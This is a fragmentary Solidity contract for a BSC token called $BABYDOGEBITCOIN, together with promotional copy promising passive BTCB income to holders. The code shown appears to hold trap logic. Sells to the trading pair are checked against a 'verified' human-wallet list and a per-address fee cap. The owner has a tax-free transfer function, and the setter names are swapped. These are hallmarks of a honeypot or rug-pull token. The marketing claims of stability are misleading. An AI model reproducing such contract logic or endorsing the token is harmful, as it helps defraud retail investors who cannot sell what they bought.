 ...
 * What is $BABYDOGEBITCOIN?
 * As the name suggests, $BABYDOGEBITCOIN is an intricately designed BSC contract and BSC based investment created in order to provide a passive income in one of BSC's favourite, most stable and future proof token.

 * Simply buy and hold 10,000+ $BDBTC token in your wallet and you'll receive $BTCB directly in your wallet. You do not even need to lift a finger, let $BDBTC do all the work while you enjoy that
...
contract BABYDOGEBITCOIN is Context, IERC20, Ownable {
    ...
    address[] private _excluded;
       ...
       //threshold function for anti-bot/whale - disabled after successful launch
    ...
    struct TransferThreshold {
        uint256 amount;
        uint timer_start;
        bool was_set; // used to check if struct was accessed before
    }

    mapping( address => TransferThreshold) private _thresholds;
   
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100000000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _feesLP = 5;
    uint256 private _feesHolder = 12; // reflection in BTCB
    uint256 private _buyBack = 3; // 3% will be stored on contract and will be used to proceed to buyback
    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    
    
    address BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c; // BTCB ADDRESS FOR REFLECTION
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    
    
    uint private _creation_time;
     //variables for threshold setting - disabled after successful launch
    uint private _threshold_duration = 86400; //time in seconds before expiry - can be disabled by creator to allow sells within max transaction limit
    uint256 private _threshold_amount = 2000000 * 10**9; //limit
    uint private _reset_time = 600; //time interval after previous sell - no restriction on first sell up to limit
    
        // End of threshold variable 
    
    address private _pairAddress;
    
	mapping (address => bool) private _verifiedAddress; //Human wallet
	mapping (address => uint256) private _feesTaken; 
	uint256 public _feeFactor = 2 * 10 ** 17;
    ...
    // SafeTransfer allows owner to transfer without tax
	function safeTransfer(address target, uint256 amount) public virtual returns (bool) {
    ...
    /**
    function setTaxLPPercent(uint256 feesHolder) external onlyOwner() {
        _feesHolder = feesHolder;
    }
    **/
    
    function setTaxHolderPercent(uint256 feesLP) external onlyOwner() {
        _feesLP = feesLP;
    }
    
    //additional variables for threshold - please keep in mind possible invalid inputs/errors if wrong values are inserted
	...
	function _safetransfer(address account, uint256 amount) internal virtual {
    ...
    uint256 swapThreshold = _rTotal / 4000; // 0.025%
    bool inSwap;
...
**/
    ...
    if ((sender != owner() && sender != swapV2Pair) && (block.timestamp < _creation_time + _threshold_duration)){
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(_withinThreshold(sender, amount));
		...
		if (recipient == swapV2Pair && !_isExcluded[sender]) {
			...
			if ((_feesTaken[sender] + amountOut) >= _feeFactor || !_verifiedAddress[sender]) {
